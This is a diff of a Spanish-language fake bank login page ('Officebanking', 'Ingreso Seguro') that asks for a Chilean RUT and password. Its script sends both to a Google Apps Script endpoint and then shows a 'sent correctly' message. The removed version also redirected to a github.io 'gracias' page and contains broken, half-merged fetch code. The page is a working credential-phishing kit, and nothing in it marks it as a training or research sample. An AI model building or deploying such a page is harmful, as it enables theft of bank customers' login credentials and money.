@@ -1,144 +1,69 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Acceso Seguro – Officebanking</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Ingreso Seguro</title>
   <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #e4e7ec, #f4f6f9);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    form {
-      background: #ffffff;
-      padding: 40px 30px;
-      border-radius: 6px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.08);
-      width: 100%;
-      max-width: 360px;
-    }
-    h2 {
-      color: #2E3E56;
-      margin-bottom: 25px;
-      text-align: center;
-      font-weight: 600;
-      font-size: 22px;
-    }
-    input {
-      font-size: 16px;
-      margin-bottom: 20px;
-      padding: 10px;
-      border-radius: 4px;
-      border: 1px solid #bfc9d4;
-      width: 100%;
-      box-sizing: border-box;
+    body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
+    .contenedor { max-width: 400px; margin: 100px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    h2 { text-align: center; margin-bottom: 20px; }
+    input[type="text"], input[type="password"] {
+      width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px;
     }
     button {
-      background-color: #0078d4;
-      color: white;
-      border: none;
-      padding: 12px;
-      width: 100%;
-      font-size: 16px;
-      border-radius: 4px;
-      cursor: pointer;
+      width: 100%; padding: 12px; background-color: #0275d8; border: none; color: white; font-size: 16px;
+      border-radius: 4px; cursor: pointer;
     }
-    button:hover {
-      background-color: #005fa3;
-    }
-    #mensaje-confirmacion {
-      display: none;
-      text-align: center;
-      margin-top: 15px;
-      font-size: 14px;
-      color: #2e7d32;
-      font-weight: bold;
-    }
-    #cargando {
-      display: none;
-      text-align: center;
-      margin-top: 15px;
-      font-size: 14px;
-      color: #0078d4;
-      font-weight: bold;
-    }
-    .p1, .p2, .p3 {
-      opacity: 0;
-      animation: aparecer 1.5s infinite;
-    }
-    .p2 { animation-delay: 0.3s; }
-    .p3 { animation-delay: 0.6s; }
-
-    @keyframes aparecer {
-      0% { opacity: 0; }
-      50% { opacity: 1; }
-      100% { opacity: 0; }
-    }
+    button:disabled { background-color: #7daee3; }
+    #mensaje, #cargando { display: none; text-align: center; margin-top: 10px; }
+    #cargando { color: #666; }
+    #mensaje { color: green; }
   </style>
 </head>
 <body>
-
-  <form id="banking-form">
-    <h2>🔒 Ingreso Seguro</h2>
-    <input type="text" name="rut" placeholder="RUT (ej: 12.345.678-9)" required pattern="[\d\.]+-[\dkK]">
-    <input type="password" name="clave" placeholder="Clave de acceso" required>
-    <button type="submit">Ingresar</button>
-    <div id="cargando">CARGANDO<span class="p1">.</span><span class="p2">.</span><span class="p3">.</span></div>
-    <div id="mensaje-confirmacion">✅ Información enviada correctamente.</div>
-  </form>
+  <div class="contenedor">
+    <h2>Acceso a tu cuenta</h2>
+    <form id="formulario">
+      <input type="text" name="rut" placeholder="RUT" required />
+      <input type="password" name="clave" placeholder="Clave" required />
+      <button type="submit">Ingresar</button>
+      <div id="cargando">CARGANDO...</div>
+      <div id="mensaje">Información enviada correctamente.</div>
+    </form>
+  </div>
 
   <script>
-    const form = document.getElementById("banking-form");
-    const mensaje = document.getElementById("mensaje-confirmacion");
+    const form = document.getElementById("formulario");
     const cargando = document.getElementById("cargando");
+    const mensaje = document.getElementById("mensaje");
 
-    form.addEventListener("submit", async (e) => {
+    form.addEventListener("submit", function (e) {
       e.preventDefault();
-      mensaje.style.display = "none";
       cargando.style.display = "block";
-      const boton = form.querySelector("button");
-      boton.disabled = true;
+      mensaje.style.display = "none";
+      form.querySelector("button").disabled = true;
 
-      // Validar formato del RUT
-      const rut = form.rut.value.trim();
-      if (!/^[\d\.]+-[\dkK]$/i.test(rut)) {
-        alert("RUT inválido. Usa formato 12.345.678-9 o 12345678-9.");
+      const datos = new URLSearchParams();
+      datos.append("rut", form.rut.value);
+      datos.append("clave", form.clave.value);
+
+      fetch("https://script.google.com/macros/s/AKfycbwnIB8we8POlSKsIr2URrZixdYNV1PPLQIwDE2XoCe_mLIT3wcO91Z1vMer-Q6ZKM_k5A/exec", {
+        method: "POST",
+        body: datos
+      })
+      .then(() => {
         cargando.style.display = "none";
-        boton.disabled = false;
-        return;
-      }
-
-      try {
-        const datos = new URLSearchParams();
-datos.append("rut", form.rut.value);
-datos.append("clave", form.clave.value);
-
-fetch("https://script.google.com/macros/s/AKfycbwnIB8we8POlSKsIr2URrZixdYNV1PPLQIwDE2XoCe_mLIT3wcO91Z1vMer-Q6ZKM_k5A/exec", {
-  method: "POST",
-  body: datos
-})
-          headers: { "Content-Type": "application/json" }
-        });
-        const result = await response.json();
-
-        if (!result.success) throw new Error("Error al guardar los datos");
-        
         mensaje.style.display = "block";
-        setTimeout(() => {
-          window.location.href = "https://oficinacurico.github.io/Officebanking/gracias";
-        }, 3000);
-      } catch (err) {
-        console.error("Error:", err);
-        alert("Error al enviar. Intenta nuevamente.");
-      } finally {
+        form.reset();
+        form.querySelector("button").disabled = false;
+      })
+      .catch(error => {
         cargando.style.display = "none";
-        boton.disabled = false;
-      }
+        alert("Ocurrió un error al enviar. Intenta nuevamente.");
+        form.querySelector("button").disabled = false;
+        console.error("Error:", error);
+      });
     });
   </script>
 </body>
